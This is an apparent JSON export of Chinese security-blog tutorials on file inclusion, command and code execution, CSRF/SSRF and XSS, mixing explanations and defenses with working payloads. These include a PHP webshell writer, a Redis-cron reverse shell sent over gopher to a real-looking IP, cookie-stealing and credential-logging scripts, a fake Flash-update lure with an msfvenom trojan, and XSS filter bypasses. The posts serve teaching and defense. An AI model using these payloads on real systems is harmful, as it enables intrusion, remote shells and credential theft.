等","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"},{"name":"XXE","slug":"XXE","permalink":"https://www.ixxzhi.cn/tags/XXE/"}]},{"title":"文件包含漏洞","slug":"文件包含漏洞","date":"2023-08-19T16:04:02.000Z","updated":"2023-08-19T16:41:20.596Z","comments":true,"path":"2023/08/20/文件包含漏洞/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","excerpt":"​ 开发人员一般会把重复使用的函数写道单个文件中、需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。","text":"​ 开发人员一般会把重复使用的函数写道单个文件中、需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。 原理 ​ 文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行非预期的代码。从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。 1234567&lt;?php if($_GET[page])&#123; include $_GET[page]; &#125; else&#123; include &quot;home.php&quot;; &#125;?&gt; 常用函数 require() 只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本。 require_once() include() 执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行。 include_once() 条件 程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量 php.ini配置文件：allow_url_fopen和allow_url_include为On 注意 php中只要文件内容符合php语法规范，包含时不管扩展名是什么都会被php解析 若文件内容不符合php语法规范则会暴露其源码 php.ini配置文件只有开启了allow_url_fopen才可以包含文件 分类 本地包含 可以包含本地文件，在条件允许时甚至能执行代码 读敏感文件，读php文件 包含日志文件GetShell 包含data:或php:&#x2F;&#x2F;input等伪协议 若有phpinfo则可以包含临时文件 配合上传图片马，然后包含从而GetShell 远程文件包含 包含远程的木马或病毒文件，从而GetShell 案例 12345#index.php&lt;?php $filename=$_GET[&#x27;page&#x27;]; include($filename);?&gt; 12#LFI.php&lt;?php echo &quot;本地文件包含&quot;?&gt; 1234#info.php&lt;?php phpinfo();?&gt; 本地文件包含的过程 首先让page&#x3D;LFI.php文件 page的值传给遍历filename include包含这个变量 网页便包含了这个文件 常见敏感文件 windows c:&#x2F;windows&#x2F;system32&#x2F;inetsrv&#x2F;MetaBase.xml &#x2F;&#x2F;IIS配置文件 c:&#x2F;windows&#x2F;repair&#x2F;sam &#x2F;&#x2F;存储系统初次安装的密码 c:&#x2F;ProgramFiles&#x2F;mysql&#x2F;my.ini &#x2F;&#x2F;MySQL配置 c:&#x2F;ProgramFile&#x2F;mysql&#x2F;data&#x2F;mysql&#x2F;user.MYD &#x2F;&#x2F;MySQL root c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;php配置信息 c:&#x2F;windows&#x2F;my.ini linux &#x2F;etc&#x2F;passwd &#x2F;&#x2F;账户信息 &#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码文件 &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2默认配置文件 &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置 &#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;php相关配置 &#x2F;etc&#x2F;my.conf &#x2F;&#x2F;MySQL配置文件 绕过 1234&lt;?php $filename = $_GET[&#x27;page&#x27;]; include($filename.&quot;.html&quot;);?&gt; %00截断 php的00截断是5.2x版本的一个漏洞，当用户输入的url参数包含%00经过浏览器自动转码后截断后面字符。 条件 allow_url_fopen&#x3D;on magic_quotes_gpc&#x3D;off php版本&lt;5.3.4 …………*n绕过(点号截断) 原理 windows下目录最大长度为256字节，超出部分会被丢弃 Linux下目录最大长度为4096字节，超出部分会被丢弃。 所以用………绕过的时候windows系统中，点号需要长于256，Linux系统中点号要长于4096. 长路径截断 条件 windows系统下，目录最大长度为256字节，超出的部分会被丢弃，路径需要长于256字节 Linux系统下需要4096. 文件包含php封装协议 封装： 封装是php面向对象的其中一个特性，将多个可重复使用的函数封装到一个类里面。在使用时直接实例化该类的某一个方法，获得需要的数据。 php带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议，还能通过stream_wrapper_register()来注册自定义的封装协议。 协议类型 file:&#x2F;&#x2F; 访问本地文件系统 http:&#x2F;&#x2F; 访问http(s)网址 ftp:&#x2F;&#x2F; 访问FTP(s) URLs php:&#x2F;&#x2F; 访问各个输入输出流 ssh2:&#x2F;&#x2F; Secure Sehll 2 rar:&#x2F;&#x2F; rar zlib:&#x2F;&#x2F; 压缩流 data:&#x2F;&#x2F; 数据(RFC 2397) glob:&#x2F;&#x2F; 查找匹配的文件路径模式 phar:&#x2F;&#x2F; php归档 ogg:&#x2F;&#x2F; 音频流 expect:&#x2F;&#x2F; 处理交互式的流 开启文件包含功能的条件 &#x2F;etc&#x2F;php.ini allow_url_fopen: on（默认开启） allow_url_include: on（默认关闭） php:&#x2F;&#x2F;协议 php:&#x2F;&#x2F;stdin 只读协议 php:&#x2F;&#x2F;stderr只写协议 php:&#x2F;&#x2F;input协议 利用文件包含漏洞的时候经常会碰到file_get_contents()函数，这个函数的作用是把整个文件读入一个字符串中 用法 123&lt;?php echo file_get_contents(&quot;php://input&quot;);?&gt; fopen()函数 php:&#x2F;&#x2F;input 只能够获取POST参数中的数据，而真正能够创建文件和把数据写入文件的函数时fopen()函数和fputs()函数 fopen()函数时用来打开文件，如果打开失败则返回false 语法：fopen(filename,mode,include_path,context) 参数 描述 filename 必需，规定打开的文件url mode 必需，规定要求到该文件&#x2F;流的访问类型，可能的值见下表 include_path 可选，如果也需要在include_path中检索文件的话，可以将该参数设为1或true context 可选，规定文件句柄的环境，context是可以修改流的行为的一套选项 fopen()将filename指定的名字资源绑定到一个流上。如果filename是”scheme:&#x2F;&#x2F;…”的格式，则被当成是一个URL，php将搜索协议处理器来处理此模式。如果该协议尚未注册封装协议，php将发出一条消息来帮助检查脚本中潜在的问题并将filename当成一个普通的文件名执行下去。 ​ 如果php认为filename指定的是一个本地文件，将尝试在该文件上打开一个流。该文件必须是php可以访问的，因此需要确认文件访问权限允许该访问，如果激活了安全模式或者open_basedir则会应用进一步的限制。 ​ 如果php认为filename指定的是一个已注册的协议，而该协议被注册为一个网络URL，php将检查并确认allow_url_fopen已被激活.如果关闭了，php将发出一个警告，而fopen的调用则失败。 例如：fopen(“abc.php”,”w”) 以写入的方式打开一个”ak.txt”文件，如果没有此文件便创建一个。 fputs() fputs()函数的作用是写入文件(课安全的用于二进制文件)，它是fwrite()函数的别名。 语法：fputs(file,string,length) 参数 描述 file 必需，规定要写入的打开文件 string 必需，规定要吸入文件的字符串 length 可选，规定要写入的最大字节数 12345&lt;?php $file = fopen(&quot;shell.php&quot;,&quot;w&quot;); echo fputs($file,&quot;Hello World!!!&quot;); fclose($file);?&gt; php:&#x2F;&#x2F;input 搭配fputs()写入文件 ?page&#x3D;php:&#x2F;&#x2F;input bp抓包，再写入post参数 12&lt;?php fupts(fopen(&#x27;any.txt&#x27;,&quot;w&quot;),&#x27;hello any&#x27;);?&gt;; 写入一句话木马 123```php&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;);?&gt; 执行命令 1&lt;?php system(&quot;net user admin admin /add&quot;);?&gt; php:&#x2F;&#x2F;filter 最常用的一个伪协议，一般用来进行任意文件读取 用法：?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxx.php 使用条件：只是读取，需要开启allow_url_fopen,不需要开启allow_url_include; php:&#x2F;&#x2F;filter目标使用以下的参数作为它路径的一部分； 复合过滤链能够再一个路径上指定，详细使用这些参数可以参考具体范例。 名称 描述 resource&#x3D;&lt;要过滤的数据流&gt; 指定流你要筛选过滤的数据流 read&#x3D;&lt;读链的筛选列表&gt; 可以设定一个或多个过滤器名称，管道符||分隔 write&#x3D;&lt;写链的筛选列表&gt; 可以设定一个或多个过滤器名称，管道符||分隔 &lt;;两个链的筛选列表&gt; 任何没有以read&#x3D;或write&#x3D;作前缀的筛选器列表会视情况应用于读或写链 ​","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"}]},{"title":"命令执行漏洞","slug":"命令执行漏洞","date":"2023-08-19T16:02:53.000Z","updated":"2023-08-19T16:41:08.846Z","comments":true,"path":"2023/08/20/命令执行漏洞/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"原理 应用程序有时候需要调用一些执行系统命令的函数，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中、从而造成命令执行攻击、这就是命令执行漏洞。","text":"原理 应用程序有时候需要调用一些执行系统命令的函数，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中、从而造成命令执行攻击、这就是命令执行漏洞。 常用函数 system 用来执行一个外部应用程序并将相应的执行结果输出 passthru 可以用来执行一个unix系统命令并显示原始的输出 exec 用来执行一个外部的应用程序 eval 函数会将参数字符串作为php程序代码来执行 system函数 1234&lt;?php $cmd = $_GET[&#x27;cmd&#x27;]; system($cmd);?&gt; windows支持 | 直接执行后面的语句 ping 127.0.0.1 | whoami || 前面的语句为假、执行后面的。ping 2 || whoami &amp; 前面的语句为假则直接执行后面的，前面可真可假 ping 127.0.0.1&amp;whoami &amp;&amp; 前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami linux支持 ; 前面的执行完执行后面的 ping 127.0.0.1;whoami | 显示后面的执行结果 ping 127.0.0.1 | whoami || 当前面的执行出错时执行后面的 ping 2 || whoami &amp; 当前面的语句为假则直接执行后面的，前面可真可假 ping 127.0.0.1 &amp; whoami &amp;&amp; 前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami 案例 system函数 1234&lt;?php $cmd = $_GET[&#x27;cmd&#x27;]; system($cmd);?&gt; shell_exec函数 12345&lt;?php highlight_file(_FILE_); $ip = $_GET[&#x27;ip&#x27;]; $addr = shell_exec(&#x27;ping &#x27;.$ip);?&gt; payload ?ip&#x3D;12|ping %username%.znbth5.dnslog.cn https://blog.csdn.net/zhangge3663/article/details/117413265 linux ping -c 3 ‘whoami ‘.znbth5.dnslog.cn 检测 代码审计 漏扫工具 公开漏洞 网站功能点","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"}]},{"title":"代码执行漏洞","slug":"代码执行漏洞","date":"2023-08-19T16:02:10.000Z","updated":"2023-08-19T16:44:12.472Z","comments":true,"path":"2023/08/20/代码执行漏洞/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"原理 ​ 把用户提交的参数作为代码去执行。动态代码执行函数过滤参数不严格，导致用户输入数据作为服务端代码执行。","text":"原理 ​ 把用户提交的参数作为代码去执行。动态代码执行函数过滤参数不严格，导致用户输入数据作为服务端代码执行。 危害 执行脚本代码 产生 web源码，一些常见的cms 中间件漏洞 相关函数 eval() assert() preg_replace() create_function() call_user_func() call_user_func_array() …. eval,assert函数 eval()，php4, phjp 5,php 7把字符串当作php代码执行、当用户可以控制字符串那么此时就存在代码执行漏洞。 12345#eval.php&lt;?php $a = $_GET[&#x27;cmd&#x27;]; eval($a);?&gt; payload: ?cmd&#x3D;phpinfo(); preg_replace函数 preg_replace()函数是执行一个正则表达式的搜索和替换、如果存在危险的&#x2F;e修饰符，会使preg_replace()将替换的字符串当作php代码执行。 1234#preg_replace.php&lt;?php echo preg_replace(&quot;/hello/e&quot;,$_GET[&quot;cmd&quot;],&quot;helloworld&quot;);?&gt; payload: ?cmd&#x3D;phpinfo(); 动态函数调用 在php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数。在php语言中，可以通过动态函数调用来对代码进行执行。 1234567891011#function.php&lt;?php function A()&#123; return &quot;..A..&quot;; &#125; function B()&#123; return &quot;..B..&quot;; &#125; $fun = $_REQUEST[&#x27;cmd&#x27;]; echo $fun();?&gt; payload ?fun&#x3D;phpinfo call_user_func() call_user_func()函数的作用是把第一个参数作为回调函数调用。 1call_user_func (callable $callback [, mixed $parameter[, mixed $...]]):mixed 第一个参数callback是被调用的回调函数，其余参数是回调函数的参数 123&lt;?php call_user_func($_REQUEST[&#x27;call&#x27;],$_REQUEST[&#x27;cmd&#x27;]);?&gt; payload ?call&#x3D;system&amp;cmd&#x3D;whoami","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"},{"name":"RCE","slug":"RCE","permalink":"https://www.ixxzhi.cn/tags/RCE/"}]},{"title":"CSRF-SSRF","slug":"CSRF-SSRF","date":"2023-08-19T16:01:56.000Z","updated":"2023-09-04T08:06:51.978Z","comments":true,"path":"2023/08/20/CSRF-SSRF/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/CSRF-SSRF/","excerpt":"CSRF ​ CSRF(跨站请求伪造)，攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作）。因为浏览器之前认证过、所以被访问的站点会认为这是真正的用户操作而去运行。","text":"CSRF ​ CSRF(跨站请求伪造)，攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作）。因为浏览器之前认证过、所以被访问的站点会认为这是真正的用户操作而去运行。 原理 条件 用户已经登录了网站，具有执行各个功能的权限。 攻击者知道功能的数据包。 用户访问了攻击者构造的恶意URL。 利用 pikachu靶场 看到可以修改个人信息 防御 当用户修改密码时需要输入原密码 检验referer来源，验证是否为管理员本人在操作 设置随机token验证 设置验证码 http头中自定义属性并验证 SSRF 服务端请求伪造是指一种由攻击者造成服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标都是从外网访问的内部系统，借助服务端发起伪造的请求、可以访问到与它相连而与外网隔离的内部系统。 原理 由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。 思路 web功能上查找 分享：通过URL地址分享网页内容 转码服务：通过URL地址把原地址的网页内容调优使其更适合手机屏幕浏览 在线翻译：通过URL地址翻译对应文本的内容 图片加载和下载：通过URL地址加载或下载图片 图片、文章收藏功能 未公开的api实现以及其他调用URL的功能 从URL关键字中寻找 share wapurl link src source target u 3g display sourceURL imageURL domain等 利用 端口扫描 内网探测 漏洞利用 文件读取等 加载其他东西 ?url&#x3D;http://xxx.xx.xx 扫描端口 ?url&#x3D;http://172.168.10.11:8000/ 协议利用 文件读取：file:&#x2F;&#x2F;&#x2F;c:&#x2F;aaa&#x2F;bb.txt gopher协议攻击内网（条件苛刻） gopher协议在ssrf的利用中一般用来攻击redis，mysql，fastcgi，smtp等服务 格式： gopher:&#x2F;&#x2F;ip:port&#x2F;_TCP&#x2F;IP数据流 注意 gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行 数据流末尾使用%0d%0a代表消息结束 gopher攻击redis redis数据流格式： *&lt;参数数量&gt; CR LF $&lt;参数1的字节数量&gt; CR LF &lt;参数1的数据&gt; CR LF … $&lt;参数N的字节数量&gt; CR LF &lt;参数N的数据&gt; CR LF 简单示例 *4：表示4个参数config、set、dir、&#x2F;var&#x2F;www&#x2F;html $6：表示每个参数的字节长度config长度为6 *4 $6 config $3 set $3 dir $13 &#x2F;var&#x2F;www&#x2F;html 写入redis计划任务 set ttt “\\n\\n\\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xx.xxx.xx&#x2F;1444 0&gt;&amp;1\\n\\n\\n\\n”config set dir &#x2F;var&#x2F;spool&#x2F;cronconfig set dbfilename rootsavequite gopher协议数据流 gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_3%0d%0a$3%0d%0aset%0d%0a$3%0d%0attt%0d%0a$69%0d%0a%0a%0a%0a&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xx.xxx.xx&#x2F;14440&gt;&amp;1%0a%0a%0a%0a%0d%0a4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a1%0d%0a$4%0d%0asave%0d%0a1%0d%0a$4%0d%0aquit%0d%0a payload gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%2a%33%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%33%25%30%64%25%30%61%74%74%74%25%30%64%25%30%61%24%36%39%25%30%64%25%30%61%25%30%61%25%30%61%25%30%61%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%32%34%2e%32%32%31%2e%38%31%2e%32%35%32%2f%31%34%34%34%20%30%3e%26%31%25%30%61%25%30%61%25%30%61%25%30%61%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%33%25%30%64%25%30%61%64%69%72%25%30%64%25%30%61%24%31%36%25%30%64%25%30%61%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%30%25%30%64%25%30%61%64%62%66%69%6c%65%6e%61%6d%65%25%30%64%25%30%61%24%34%25%30%64%25%30%61%72%6f%6f%74%25%30%64%25%30%61%2a%31%25%30%64%25%30%61%24%34%25%30%64%25%30%61%73%61%76%65%25%30%64%25%30%61%2a%31%25%30%64%25%30%61%24%34%25%30%64%25%30%61%71%75%69%74%25%30%64%25%30%61 查看写入的key url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;keys * 查看是否写入成功 url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;get ttt SSRF绕过 添加端口 http://127.0.0.1等价于http://127.0.0.1:80 https端口 443 过滤时用 . 号分割，127.0.0.1分割为：（127，0，0，1:80），最后一个不是数字，就可以绕过IP地址的限制。 短网址 把过滤的域名生成短网址。来进行绕过，过滤了某些域名的情况。 数值绕过 IP地址时32位二进制数据组成 目前看到的IP地址都是采用点分十进制宝石：如127.0.0.1、172.168.0.1 127.0.0.1 01111111.00000000.00000000.00000001转换成十进制：2130706433浏览器会自动解析成127.0.0.1八进制：0177.00.00.01十六进制：0x7f.0x0.0x0.0x1 跳转绕过，加@可以跳转到指定的URL http://www.baidu.com@127.0.0.1会跳转到127.0.0.1 等价替换 127.0.0.1可以用localhost或::来替换 127。0。0。1 &gt;&gt;&gt; 127.0.0.1 利用302跳转 如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。http://xip.io 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。 SSRF防御 过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态 限制请求的端口，比如80、443、8080、8090. 禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F;等引起的问题 使用DNS缓存或者HOST白名单的方式。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"}]},{"title":"XSS漏洞","slug":"XSS漏洞","date":"2023-08-19T16:01:39.000Z","updated":"2023-09-14T01:53:30.547Z","comments":true,"path":"2023/08/20/XSS漏洞/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/20/XSS%E6%BC%8F%E6%B4%9E/","excerpt":"XSS漏洞介绍 ​ XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets，CSS)的缩写混淆，故缩写为XSS。这是一种将任意JavaScript代码插入到其他Web用户页面里面执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里面嵌入恶意代码。当用户浏览该页时，这些嵌入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如cookie窃取等。","text":"XSS漏洞介绍 ​ XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets，CSS)的缩写混淆，故缩写为XSS。这是一种将任意JavaScript代码插入到其他Web用户页面里面执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里面嵌入恶意代码。当用户浏览该页时，这些嵌入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如cookie窃取等。 XSS产生原理 ​ 形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输入到前端时被浏览器当作有效代码解析执行从而产生危害。 XSS的危害 网络钓鱼，包括获取各类用户账号 窃取用户cookie资料，从而获取用户隐私信息 劫持用户(浏览器)会话，从而执行任意操作 强制弹出广告页面，刷流量等 网页挂马 结合其他漏洞，如scrf，实施进一步危害 XSS常出现的地方 数据交互的地方 1234get、post、cookies、headers反馈与浏览富文本编辑器各类标签插入和自定义 数据输出的地方 123用户资料关键词、标签、说明文件上传 XSS类型 反射型 ​ 又称为非持久型XSS，这种攻击方式往往具有一次性，只在用户单击时触发。跨站代码一般存在链接中，当受害者请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码通常不存储服务端。 常出现的位置 搜索栏、用户登录入口、输入表单等 攻击流程 存储型 ​ 存储型XSS（Stored xss Attacks），也就是持久型XSS，比反射型XSS更具有威胁性。攻击脚本将被永久的存放在目标服务器的数据库或文件中。这是利用起来最方便的跨站类型，跨站代码存储与服务端（比如数据库中）。 常出现的位置 论坛、博客、留言板、网站的留言、评论、日志等交互处 攻击流程 DOM型 ​ DOM是文档对象模型（Document Object Model）的缩写。它是HTML文档的对象表示，同时也是外部内容（例如JavaScript）与HTML元素之间的接口。解析树的根节点是“Document”对象。使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。 ​ 它是基于DOM文档对象的一种漏洞，并且DOM型XSS是基于JS的，并不需要与服务器进行交互。 XSS常用测试语句 12345&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=x onerror=alert()&gt;&lt;svg onload=alert(1)/&gt;&lt;a href=javascript:alert(1)/&gt;&lt;details open ontoggle=confirm(document[`coo`+`kie`])/&gt; https://github.com/payloadbox/xss-payload-list XSS攻击利用XSS平台 XSS平台 https://xss.yt https://xssaq.com 自己搭建平台 手动测试 cookie.php 1234&lt;?php $cookie = $_REQUEST[&#x27;abc&#x27;]; file_put_contents(&#x27;cookie.txt&#x27;,$cookie);?&gt; payload 1&lt;script&gt;document.location=&#x27;http://100.100.100.26/cookie.php?cookie=&#x27;+document.cookie&lt;/script&gt; beef-xss工具 安装：http://www.loongten.com/2020/01/08/pentest-xss-beef/（kali自带） XSS钓鱼 version.js 12345678910window.alert = function(name)&#123; var iframe = document. createElement(&quot;IFRAME&quot;); iframe.style.display=&quot;none&quot;; iframe.setAttribute(&quot;src&quot;,&#x27;data:text/plain,&#x27;); document. documentElement.appendChild(iframe); window.frames [0].window.alert(name); iframe.parentNode.removeChild(iframe);&#125;alert( &quot;您的FLASH版本过低，尝试升级后访问该⻚面! &quot;);window. location.href=&quot;http://192.168.1.21:8000&quot;; payload 1&lt;script src=&quot;http://192.168.1.2:8000/version.js&quot;&gt;&lt;/script&gt; 生成木马 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=8000 -f exe &gt; flash.exe 使用winrar制作压缩包（自解压exe） 将生成的木马放在网站上 XSS表单劫持 ​ 已获取权限，但不知道管理员账号、密码 pass.php 123456&lt;?php $name=$_REQUEST[&#x27;name&#x27;]; $pass=$_REQUEST[&#x27;pass&#x27;]; $a=&quot;账号：&quot;.$name.&quot;密码：&quot;.$pass.&quot;||&quot;; file_put_contents(&#x27;pass.txt&#x27;,$a,FILE_APPEND | LOCK_EX);?&gt; payload 12$a = &#x27;&lt;script src=http://192.168.1.21/pass.php?name=&#x27;.$name.&quot;&amp;pass=&quot;.$passow rd.&#x27;&gt;&lt;/script&gt;&#x27;;echo $a; XSS常见绕过 大小写绕过() 双写绕过 使用别的标签 编码绕过 js编码、html实体编码、url编码、hex编码等 XSS黑名单绕过 不使用&quot; &quot; 1&lt;input onfocus=alert(&#x27;1&#x27;) autofocus/&gt; 不使用 &#39; &#39; 1&lt;input onfocus=&quot;alert(/1/)&quot; autofocus/&gt; 不使用 () 1&lt;input onfocus=&quot;alert`&#x27;1&#x27;`&quot; autofocus/&gt; 不使用 () &#39;&#39; &quot;&quot; 1&lt;input onfocus=alert`1`autofocus/&gt; 使用html实体编码绕过 1234//方法一&lt;input onfocus=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#49;&amp;#39;&amp;#41;&quot; autofocus/&gt;//方法二&lt;input onfocus=&quot;&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#49&amp;#39&amp;#41&quot; autofocus/&gt; XSS绕过-onclick触发 123&lt;div onclick=&quot;alert(&#x27;xss&#x27;)&quot;/&gt;&lt;div onmouseenter=&quot;alert(&#x27;xss&#x27;)&quot;/&gt; onclick是鼠标点击事件，我们可以在元素中定义JavaScript事件； 另一个绕过的办法就是在属性和&#x3D;之间插入一个空格 XSS防御 ​ 因为XSS漏洞涉及输入和输出两部分，所以其修复也分两种 A:过滤输入的数据，包括 &#39; &quot; , &lt; &gt; on* 等非法字符。 B:对输出到页面的数据进行相应的编码转换，包括HTML实体编码、Javascript编码等。 C:输出编码：主要用HTML实体代替字面量字符，这样做可以确保浏览器安全处理可能存在的恶意字符，将其当作HTML文档的内容而非结构加以处理。 常见的实体编码 显示 实体名字 实体编号 &lt; &amp;lt; $#60; &gt; &amp;gt; &amp;#62; &amp; &amp;amp; &amp;#38; ‘ &amp;quot; &amp;#34; 设置关键字黑名单 设置http-only https://blog.csdn.net/weixin_44270509/article/details/102844897 使用html实体编码等 SOP（同源策略） SOP把拥有相同主机名、协议和端口的页面视为同一来源，不同来源的资源之间交互是受到限制的。 XSS-lab xss-lab通关：payload第一关：&lt;script&gt;alert(1)&lt;/script&gt;第二关：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;第三关：&#39; onclick=&#39;alert(1)第四关：&quot; onclick=&quot;alert(1)第五关：&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;第六关：&quot;&gt;&lt;a HRef=&#39;javaScript:alert(1)&#39;&gt;第七关：&quot;&gt;&lt;a hrhrefef=&#39;javascscriptript:alert(1)&#39;&gt;第八关：&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101 